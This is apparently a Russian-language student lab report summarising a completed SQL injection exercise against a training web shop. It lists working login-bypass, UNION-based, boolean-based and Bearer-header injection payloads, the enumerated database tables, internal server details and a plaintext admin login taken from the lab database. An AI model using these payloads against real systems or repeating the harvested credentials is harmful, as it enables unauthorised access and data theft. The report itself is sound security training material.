# ЛР3 SQLi. Финальная сводка

## Стенд

Название лабораторной: Cheerful-Island

UUID:

    281597ea-a798-410d-9e81-43bb6b4ce978

Тип сайта:

    магазин одежды

URL стенда:

    http://ibks.spbstu.ru:8086/away/281597ea-a798-410d-9e81-43bb6b4ce978

Статус:

    выполнена

Создана:

    06.05.2026 18:07

Запущена:

    06.05.2026 18:08

Решена:

    06.05.2026 19:07

## Найденные флаги

    ibks1_{653b6e69e46c8}
    ibks2_{9a7d9c2fcbeaf}
    ibks3_{93f8739c36549}

Итоговый ответ:

    secret_653b6e69e46c89a7d9c2fcbeaf93f8739c36549

## Основной SQLi-вектор

Уязвимая ручка:

    POST /api/login

Уязвимый принцип:

    username и password напрямую подставляются в SQL-запрос авторизации.

Успешный bypass:

    {"username":"admin","password":"' OR 1=1-- "}

Успешный UNION-тест:

    {"username":"x","password":"' UNION SELECT 'test_login','test_password','test_role'-- "}

Результат UNION-теста:

    Login successful: user=RealDictRow({'login': 'test_login', 'password': 'test_password', 'role': 'test_role'})

## Полученные таблицы

    public.users
    public.user_personal_info
    public.product_categories
    public.products
    public.orders
    public.payments
    public.favorite_products
    public.reviews
    public.price_history
    public.shipping_addresses

## Колонки secret с флагами

    user_personal_info.secret = ibks1_{653b6e69e46c8}
    products.secret = ibks2_{9a7d9c2fcbeaf}
    reviews.secret = ibks3_{93f8739c36549}

## Сведения о PostgreSQL

Версия:

    PostgreSQL 15.12 (Debian 15.12-1.pgdg120+1), 64-bit

База данных:

    281597ea_a798_410d_9e81_43bb6b4ce978

Пользователь БД:

    sqli_user

Схема:

    public

Адрес сервера БД:

    172.18.0.6/32:5432

max_connections:

    100

activity_count на момент проверки:

    26

## Найденный пользователь-администратор

    login: everybody_use@rambler.ru
    password: (WUM70hl*5gaAQfg
    role: admin

После входа под администратором был доступен личный кабинет пользователя.

## Дополнительный SQLi-вектор 1: category

Ручка:

    GET /api/products?category=...

Boolean true payload:

    category=x' OR '1'='1'--

Результат:

    возвращен список товаров.

Boolean false payload:

    category=x' AND '1'='2'--

Результат:

    возвращен пустой массив [].

UNION payload:

    category=x' UNION SELECT 1,'cat','desc','name',1.00,1,true--

Результат:

    в JSON-ответе появилась искусственная строка товара.

Вывод:

    параметр category уязвим к boolean-based и UNION-based SQL Injection.

## Дополнительный SQLi-вектор 2: Authorization Bearer

Ручка:

    GET /api/profile

Payload:

    Authorization: Bearer x'/**/OR/**/'1'='1'--

Результат:

    сервер вернул профиль другого пользователя:
    dinner_employee@gmail.com

Вывод:

    значение Bearer-токена небезопасно подставляется в SQL-запрос поиска пользователя.

## Неподтвержденные и побочные проверки

Path-параметр article:

    GET /api/products/3294072781203 OR 1=1

Результат:

    404 Not Found

Вывод:

    SQLi в path-параметре article не подтверждена, вероятно, запрос отсекается на уровне Flask route.

Write-endpoints:

    POST /api/favorites
    POST /api/products/{article}/reviews

Результат:

    function datetime(unknown) does not exist

Вывод:

    backend использует SQL-конструкцию datetime(...), характерную для SQLite, но стенд работает на PostgreSQL.

## Итог

SQLi-часть лабораторной выполнена полностью. Получены все три флага, подтверждены несколько SQLi-векторов, собраны сведения о структуре БД, пользователях приложения, администраторе и сервере PostgreSQL.
